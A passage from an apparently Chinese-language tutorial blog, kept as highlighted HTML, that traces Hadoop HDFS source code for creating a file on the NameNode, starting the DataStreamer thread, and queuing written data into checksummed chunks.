out.start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-NN处理DN的创建请求">2.2 NN处理DN的创建请求</h3><p>点击create</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HdfsFileStatus <span class="title">create</span><span class="params">(String src, FsPermission masked,</span></span></span><br><span class="line"><span class="function"><span class="params">    String clientName, EnumSetWritable&lt;CreateFlag&gt; flag,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> createParent, <span class="keyword">short</span> replication, <span class="keyword">long</span> blockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">    CryptoProtocolVersion[] supportedVersions, String ecPolicyName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span>;</span><br></pre></td></tr></table></figure><p>查找create实现类，点击NameNodeRpcServer，在NameNodeRpcServer.java中搜索create</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> HdfsFileStatus <span class="title">create</span><span class="params">(String src, FsPermission masked,</span></span></span><br><span class="line"><span class="function"><span class="params">    String clientName, EnumSetWritable&lt;CreateFlag&gt; flag,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> createParent, <span class="keyword">short</span> replication, <span class="keyword">long</span> blockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">    CryptoProtocolVersion[] supportedVersions, String ecPolicyName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">// 检查NN启动</span></span><br><span class="line">  checkNNStartup();</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  HdfsFileStatus status = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    PermissionStatus perm = <span class="keyword">new</span> PermissionStatus(getRemoteUser()</span><br><span class="line">        .getShortUserName(), <span class="keyword">null</span>, masked);</span><br><span class="line">  <span class="comment">// 重要</span></span><br><span class="line">    status = namesystem.startFile(src, perm, clientName, clientMachine,</span><br><span class="line">        flag.get(), createParent, replication, blockSize, supportedVersions,</span><br><span class="line">        ecPolicyName, cacheEntry != <span class="keyword">null</span>);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    RetryCache.setState(cacheEntry, status != <span class="keyword">null</span>, status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  metrics.incrFilesCreated();</span><br><span class="line">  metrics.incrCreateFileOps();</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HdfsFileStatus <span class="title">startFile</span><span class="params">(String src, PermissionStatus permissions,</span></span></span><br><span class="line"><span class="function"><span class="params">    String holder, String clientMachine, EnumSet&lt;CreateFlag&gt; flag,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> createParent, <span class="keyword">short</span> replication, <span class="keyword">long</span> blockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">    CryptoProtocolVersion[] supportedVersions, String ecPolicyName,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> logRetryCache)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  HdfsFileStatus status;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    status = startFileInt(src, permissions, holder, clientMachine, flag,</span><br><span class="line">        createParent, replication, blockSize, supportedVersions, ecPolicyName,</span><br><span class="line">        logRetryCache);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (AccessControlException e) &#123;</span><br><span class="line">    logAuditEvent(<span class="keyword">false</span>, <span class="string">"create"</span>, src);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">  &#125;</span><br><span class="line">  logAuditEvent(<span class="keyword">true</span>, <span class="string">"create"</span>, src, status);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> HdfsFileStatus <span class="title">startFileInt</span><span class="params">(String src,</span></span></span><br><span class="line"><span class="function"><span class="params">    PermissionStatus permissions, String holder, String clientMachine,</span></span></span><br><span class="line"><span class="function"><span class="params">    EnumSet&lt;CreateFlag&gt; flag, <span class="keyword">boolean</span> createParent, <span class="keyword">short</span> replication,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">long</span> blockSize, CryptoProtocolVersion[] supportedVersions,</span></span></span><br><span class="line"><span class="function"><span class="params">    String ecPolicyName, <span class="keyword">boolean</span> logRetryCache)</span> <span class="keyword">throws</span> IOException </span>&#123;       </span><br><span class="line">  ... ...</span><br><span class="line">  stat = FSDirWriteFileOp.startFile(<span class="keyword">this</span>, iip, permissions, holder,</span><br><span class="line">        clientMachine, flag, createParent, replication, blockSize, feInfo,</span><br><span class="line">        toRemoveBlocks, shouldReplicate, ecPolicyName, logRetryCache);</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> HdfsFileStatus <span class="title">startFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    ... ...)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  ... ...</span><br><span class="line">  FSDirectory fsd = fsn.getFSDirectory();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 文件路径是否存在校验</span></span><br><span class="line">  <span class="keyword">if</span> (iip.getLastINode() != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (overwrite) &#123;</span><br><span class="line">      List&lt;INode&gt; toRemoveINodes = <span class="keyword">new</span> ChunkedArrayList&lt;&gt;();</span><br><span class="line">      List&lt;Long&gt; toRemoveUCFiles = <span class="keyword">new</span> ChunkedArrayList&lt;&gt;();</span><br><span class="line">      <span class="keyword">long</span> ret = FSDirDeleteOp.delete(fsd, iip, toRemoveBlocks,</span><br><span class="line">                                      toRemoveINodes, toRemoveUCFiles, now());</span><br><span class="line">      <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        iip = INodesInPath.replace(iip, iip.length() - <span class="number">1</span>, <span class="keyword">null</span>);</span><br><span class="line">        FSDirDeleteOp.incrDeletedFileCount(ret);</span><br><span class="line">        fsn.removeLeasesAndINodes(toRemoveUCFiles, toRemoveINodes, <span class="keyword">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// If lease soft limit time is expired, recover the lease</span></span><br><span class="line">      fsn.recoverLeaseInternal(FSNamesystem.RecoverLeaseOp.CREATE_FILE, iip,</span><br><span class="line">                               src, holder, clientMachine, <span class="keyword">false</span>);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> FileAlreadyExistsException(src + <span class="string">" for client "</span> +</span><br><span class="line">          clientMachine + <span class="string">" already exists"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fsn.checkFsObjectLimit();</span><br><span class="line">  INodeFile newNode = <span class="keyword">null</span>;</span><br><span class="line">  INodesInPath parent = FSDirMkdirOp.createAncestorDirectories(fsd, iip, permissions);</span><br><span class="line">  <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 添加文件元数据信息</span></span><br><span class="line">    iip = addFile(fsd, parent, iip.getLastLocalName(), permissions,</span><br><span class="line">        replication, blockSize, holder, clientMachine, shouldReplicate,</span><br><span class="line">        ecPolicyName);</span><br><span class="line">    newNode = iip != <span class="keyword">null</span> ? iip.getLastINode().asFile() : <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  setNewINodeStoragePolicy(fsd.getBlockManager(), iip, isLazyPersist);</span><br><span class="line">  fsd.getEditLog().logOpenFile(src, newNode, overwrite, logRetryEntry);</span><br><span class="line">  <span class="keyword">if</span> (NameNode.stateChangeLog.isDebugEnabled()) &#123;</span><br><span class="line">    NameNode.stateChangeLog.debug(<span class="string">"DIR* NameSystem.startFile: added "</span> +</span><br><span class="line">        src + <span class="string">" inode "</span> + newNode.getId() + <span class="string">" "</span> + holder);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> FSDirStatAndListingOp.getFileInfo(fsd, iip, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> INodesInPath <span class="title">addFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    FSDirectory fsd, INodesInPath existing, <span class="keyword">byte</span>[] localName,</span></span></span><br><span class="line"><span class="function"><span class="params">    PermissionStatus permissions, <span class="keyword">short</span> replication, <span class="keyword">long</span> preferredBlockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">    String clientName, String clientMachine, <span class="keyword">boolean</span> shouldReplicate,</span></span></span><br><span class="line"><span class="function"><span class="params">    String ecPolicyName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  Preconditions.checkNotNull(existing);</span><br><span class="line">  <span class="keyword">long</span> modTime = now();</span><br><span class="line">  INodesInPath newiip;</span><br><span class="line">  fsd.writeLock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    … …</span><br><span class="line"></span><br><span class="line">    newiip = fsd.addINode(existing, newNode, permissions.getPermission());</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    fsd.writeUnlock();</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">return</span> newiip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">INodesInPath <span class="title">addINode</span><span class="params">(INodesInPath existing, INode child,</span></span></span><br><span class="line"><span class="function"><span class="params">                      FsPermission modes)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> QuotaExceededException, UnresolvedLinkException </span>&#123;</span><br><span class="line">  cacheName(child);</span><br><span class="line">  writeLock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 将数据写入到INode的目录树中</span></span><br><span class="line">    <span class="keyword">return</span> addLastINode(existing, child, modes, <span class="keyword">true</span>);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    writeUnlock();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-DataStreamer启动流程">2.3 DataStreamer启动流程</h3><p>NN处理完DN请求后，再次回到DN端，启动对应的线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DFSOutputStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> DFSOutputStream <span class="title">newStreamForCreate</span><span class="params">(DFSClient dfsClient, String src,</span></span></span><br><span class="line"><span class="function"><span class="params">  FsPermission masked, EnumSet&lt;CreateFlag&gt; flag, <span class="keyword">boolean</span> createParent,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">short</span> replication, <span class="keyword">long</span> blockSize, Progressable progress,</span></span></span><br><span class="line"><span class="function"><span class="params">  DataChecksum checksum, String[] favoredNodes, String ecPolicyName)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// DN将创建请求发送给NN（RPC）</span></span><br><span class="line">  stat = dfsClient.namenode.create(src, masked, dfsClient.clientName,</span><br><span class="line">    <span class="keyword">new</span> EnumSetWritable&lt;&gt;(flag), createParent, replication,</span><br><span class="line">    blockSize, SUPPORTED_CRYPTO_VERSIONS, ecPolicyName);</span><br><span class="line">  ... ...</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建输出流</span></span><br><span class="line">  out = <span class="keyword">new</span> DFSOutputStream(dfsClient, src, stat,</span><br><span class="line">            flag, progress, checksum, favoredNodes, <span class="keyword">true</span>);</span><br><span class="line">  <span class="comment">// 开启线程run，DataStreamer extends Daemon extends Thread</span></span><br><span class="line">  out.start();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//点击DFSOutputStream</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">DFSOutputStream</span><span class="params">(DFSClient dfsClient, String src,</span></span></span><br><span class="line"><span class="function"><span class="params">    HdfsFileStatus stat, EnumSet&lt;CreateFlag&gt; flag, Progressable progress,</span></span></span><br><span class="line"><span class="function"><span class="params">    DataChecksum checksum, String[] favoredNodes, <span class="keyword">boolean</span> createStreamer)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>(dfsClient, src, flag, progress, stat, checksum);</span><br><span class="line">  <span class="keyword">this</span>.shouldSyncBlock = flag.contains(CreateFlag.SYNC_BLOCK);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Directory =&gt; File =&gt; Block(128M) =&gt; packet(64K) =&gt; chunk（chunk 512byte + chunksum 4byte）</span></span><br><span class="line">  computePacketChunkSize(dfsClient.getConf().getWritePacketSize(),</span><br><span class="line">      bytesPerChecksum);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (createStreamer) &#123;</span><br><span class="line">    streamer = <span class="keyword">new</span> DataStreamer(stat, <span class="keyword">null</span>, dfsClient, src, progress,</span><br><span class="line">        checksum, cachingStrategy, byteArrayManager, favoredNodes,</span><br><span class="line">        addBlockFlags);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击newStreamForCreate方法中的out.start()，进入DFSOutputStream.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  getStreamer().start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> DataStreamer <span class="title">getStreamer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> streamer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点击DataStreamer，进入DataStreamer.java</span></span><br><span class="line"><span class="comment">//点击Daemon，进入Daemon.java</span></span><br><span class="line"><span class="comment">//说明：out.start();实际是开启线程，点击DataStreamer，搜索run方法</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> lastPacket = Time.monotonicNow();</span><br><span class="line">  TraceScope scope = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">while</span> (!streamerClosed &amp;&amp; dfsClient.clientRunning) &#123;</span><br><span class="line">    <span class="comment">// if the Responder encountered an error, shutdown Responder</span></span><br><span class="line">    <span class="keyword">if</span> (errorState.hasError()) &#123;</span><br><span class="line">    closeResponder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DFSPacket one;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// process datanode IO errors if any</span></span><br><span class="line">    <span class="keyword">boolean</span> doSleep = processDatanodeOrExternalError();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> halfSocketTimeout = dfsClient.getConf().getSocketTimeout()/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line">      <span class="comment">// wait for a packet to be sent.</span></span><br><span class="line">      … …</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 如果dataQueue里面没有数据，代码会阻塞在这儿</span></span><br><span class="line">        dataQueue.wait(timeout);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException  e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Caught exception"</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line">      doSleep = <span class="keyword">false</span>;</span><br><span class="line">      now = Time.monotonicNow();</span><br><span class="line">      &#125;</span><br><span class="line">      … …</span><br><span class="line">      <span class="comment">//  队列不为空，从队列中取出packet</span></span><br><span class="line">      one = dataQueue.getFirst(); <span class="comment">// regular data packet</span></span><br><span class="line">      SpanId[] parents = one.getTraceParents();</span><br><span class="line">      <span class="keyword">if</span> (parents.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        scope = dfsClient.getTracer().</span><br><span class="line">          newScope(<span class="string">"dataStreamer"</span>, parents[<span class="number">0</span>]);</span><br><span class="line">        scope.getSpan().setParents(parents);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    … …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、write上传过程">3、write上传过程</h2><h3 id="3-1-向DataStreamer的队列里面写数据">3.1 向DataStreamer的队列里面写数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPut2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    FSDataOutputStream fos = fs.create(<span class="keyword">new</span> Path(<span class="string">"/input"</span>));</span><br><span class="line"></span><br><span class="line">    fos.write(<span class="string">"hello world"</span>.getBytes());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一路点击write,直到抽象方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> b)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"><span class="comment">//ctrl+alt+b查看实现类，选择FSOutputSummer.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> b)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  buf[count++] = (<span class="keyword">byte</span>)b;</span><br><span class="line">  <span class="keyword">if</span>(count == buf.length) &#123;</span><br><span class="line">    flushBuffer();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">flushBuffer</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  flushBuffer(<span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">flushBuffer</span><span class="params">(<span class="keyword">boolean</span> keep,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> flushPartial)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> bufLen = count;</span><br><span class="line">  <span class="keyword">int</span> partialLen = bufLen % sum.getBytesPerChecksum();</span><br><span class="line">  <span class="keyword">int</span> lenToFlush = flushPartial ? bufLen : bufLen - partialLen;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lenToFlush != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 向队列中写数据   </span></span><br><span class="line"><span class="comment">// Directory =&gt; File =&gt; Block(128M) =&gt; package(64K) =&gt; chunk（chunk 512byte + chunksum 4byte）</span></span><br><span class="line">writeChecksumChunks(buf, <span class="number">0</span>, lenToFlush);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!flushPartial || keep) &#123;</span><br><span class="line">      count = partialLen;</span><br><span class="line">      System.arraycopy(buf, bufLen - count, buf, <span class="number">0</span>, count);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// total bytes left minus unflushed bytes left</span></span><br><span class="line">  <span class="keyword">return</span> count - (bufLen - lenToFlush);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeChecksumChunks</span><span class="params">(<span class="keyword">byte</span> b[], <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 计算chunk的校验和</span></span><br><span class="line">  sum.calculateChunkedSums(b, off, len, checksum, <span class="number">0</span>);</span><br><span class="line">  TraceScope scope = createWriteTraceScope();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 按照chunk的大小遍历数据</span></span><br><span class="line">  <span 